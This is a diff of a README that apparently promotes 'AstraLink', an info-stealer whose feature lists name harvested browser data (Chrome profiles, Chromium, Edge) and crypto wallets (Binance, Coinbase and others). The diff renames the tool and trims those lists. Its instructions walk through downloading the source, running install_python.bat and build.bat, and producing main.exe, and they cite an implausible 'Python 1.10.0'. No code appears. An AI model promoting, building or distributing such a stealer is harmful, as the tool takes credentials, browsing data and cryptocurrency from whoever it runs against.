@@ -1,6 +1,6 @@
-# Guide and Info's about AstraLink Professional!
-<h1 align="center"> Astra Link Professional  </h1> 
-<p align= "center"> <kbd> <img  src="https://i.imgur.com/JBon1N6.png"width="1000"> </kbd><br><br>
+# Guide and Info's about AstraLink Swift!
+<h1 align="center"> Astra Link Swift  </h1> 
+<p align= "center"> <kbd> <img  src="https://imgur.com/gallery/flLe90k.png"width="1000"> </kbd><br><br>
 
 
 
@@ -61,7 +61,6 @@
 
 -   Browser Data
     -   Google Chrome Profiles
-    -   Google Sxs
     -   Chromium
     -   Chrome
     -   Edge
@@ -112,23 +111,20 @@
 
 - Logs Crypto Wallets:
 
-   - Metamask
-   - Atomic
-   - Exodus
    - Binance
    - Coinbase
-   - Trust 
-   - Phantom 
+   - Bitcoin
+   - Crypto 
 
 
                                                          ⬇ Instructions ⬇
 
 
-1. [Download source code zip](https://github.com/metaversnova/AstraLink/archive/refs/heads/main.zip)
-2. Extract the zipped folder
-3. Run ‘’install_python.bat’’ if you don't have Python 1.10.0 installed
-4. Run the builder by double clicking ‘’build.bat’’ file
-5. Follow the instructions and the executable file should be in the ‘’dist’’ folder as ‘’main.exe’’
+- [Download source code zip](https://github.com/metaversnova/AstraLink/archive/refs/heads/main.zip)
+- Extract the zipped folder
+- Run ‘’install_python.bat’’ if you don't have Python 1.10.0 installed
+- Run the builder by double clicking ‘’build.bat’’ file
+- Follow the instructions and the executable file should be in the ‘’dist’’ folder as ‘’main.exe’’
 
 
                                                            ⬇ Dependencies ⬇
